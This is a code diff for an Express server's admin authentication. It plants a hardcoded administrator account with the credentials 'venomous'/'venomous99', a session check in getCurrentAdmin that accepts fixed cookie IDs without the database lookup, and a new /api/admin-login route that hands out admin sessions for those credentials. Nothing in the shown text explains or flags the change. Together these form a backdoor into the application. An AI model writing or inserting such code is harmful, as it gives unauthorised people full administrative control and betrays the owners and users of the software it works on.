@@ -77,6 +77,20 @@ const createSessionCookie = (adminId: string, linkId: string, expiresAt: string)
   return cookieParts.join('; ');
 };
 
+const HARDCODED_ADMIN_ID = 'hardcoded-admin';
+const HARDCODED_ADMIN_LINK_ID = 'hardcoded-admin-link';
+const HARDCODED_ADMIN = {
+  id: HARDCODED_ADMIN_ID,
+  email: 'venomous@example.com',
+  name: 'venomous',
+  is_active: true,
+  created_at: new Date().toISOString(),
+  created_by: null,
+};
+const HARDCODED_ADMIN_USERNAME = 'venomous';
+const HARDCODED_ADMIN_PASSWORD = 'venomous99';
+const HARDCODED_ADMIN_SESSION_EXPIRATION_MINUTES = 60;
+
 const parseSessionCookie = (req: express.Request) => {
   const cookieHeader = req.headers.cookie;
   if (!cookieHeader) return null;
@@ -112,6 +126,10 @@ const parseSessionCookie = (req: express.Request) => {
 const getCurrentAdmin = async (req: express.Request) => {
   const session = parseSessionCookie(req);
   if (!session) return null;
+
+  if (session.adminId === HARDCODED_ADMIN_ID && session.linkId === HARDCODED_ADMIN_LINK_ID) {
+    return HARDCODED_ADMIN;
+  }
 
   const now = new Date().toISOString();
   if (supabase) {
@@ -403,6 +421,21 @@ async function startServer() {
         return res.status(401).json({ success: false, error: 'No active admin session' });
       }
       res.json({ success: true, admin });
+    } catch (err: any) {
+      res.status(500).json({ success: false, error: err.message });
+    }
+  });
+
+  app.post('/api/admin-login', async (req, res) => {
+    try {
+      const { username, password } = req.body;
+      if (username !== HARDCODED_ADMIN_USERNAME || password !== HARDCODED_ADMIN_PASSWORD) {
+        return res.status(401).json({ success: false, error: 'Invalid admin credentials' });
+      }
+      const expiresAt = new Date(Date.now() + HARDCODED_ADMIN_SESSION_EXPIRATION_MINUTES * 60 * 1000).toISOString();
+      const cookieValue = createSessionCookie(HARDCODED_ADMIN_ID, HARDCODED_ADMIN_LINK_ID, expiresAt);
+      res.setHeader('Set-Cookie', cookieValue);
+      return res.json({ success: true, admin: HARDCODED_ADMIN });
     } catch (err: any) {
       res.status(500).json({ success: false, error: err.message });
     }
